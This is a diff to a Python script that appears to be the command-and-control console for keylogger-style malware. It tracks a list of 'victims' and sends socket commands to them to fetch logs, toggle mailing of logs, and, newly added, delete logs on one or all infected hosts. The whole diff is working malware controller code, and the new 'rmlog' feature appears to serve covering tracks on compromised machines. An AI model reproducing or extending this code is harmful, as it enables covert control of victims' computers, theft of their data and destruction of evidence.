@@ -92,11 +92,18 @@ def parse_cmd(victims, PORT):
         else:
             mail_on(target, PORT, victims, intent)
         parse_cmd(victims, PORT)
+    elif intent == 'rmlog':
+        if target == 'all':
+            for addr in victims:
+                rm_log(addr, PORT, victims, intent)
+        else:
+            rm_log(target, PORT, victims, intent)
+        parse_cmd(victims, PORT)
     elif intent == 'rescan':
         main()
     elif intent == 'help' or intent == '?':
         print("[!] Syntax: <target> <command> OR <command>")
-        print("[!] Available commands: getlog, mailoff, mailon, rescan, help, exit, quit")
+        print("[!] Available commands: getlog, mailoff, mailon, rmlog, rescan, help, exit, quit")
         parse_cmd(victims, PORT)
     elif intent == 'exit' or intent == 'quit':
         print("[*] Exiting...")
@@ -105,7 +112,7 @@ def parse_cmd(victims, PORT):
     else:
         print("[-] Unknown command")
         print("[!] Syntax: <target> <command> OR <command>")
-        print("[!] Available commands: getlog, mailoff, mailon, rescan, help, exit, quit")
+        print("[!] Available commands: getlog, mailoff, mailon, rmlog, rescan, help, exit, quit")
         parse_cmd(victims, PORT)
 
 
@@ -135,6 +142,15 @@ def mail_off(target, PORT, victims, intent):
 
 
 def mail_on(target, PORT, victims, intent):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("[*] Connecting to", target+':'+str(PORT))
+    s.connect((target, PORT))
+    print(s.recv(26).decode('utf-8'))
+    s.send(intent.encode())
+    s.close()
+
+
+def rm_log(target, PORT, victims, intent):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("[*] Connecting to", target+':'+str(PORT))
     s.connect((target, PORT))
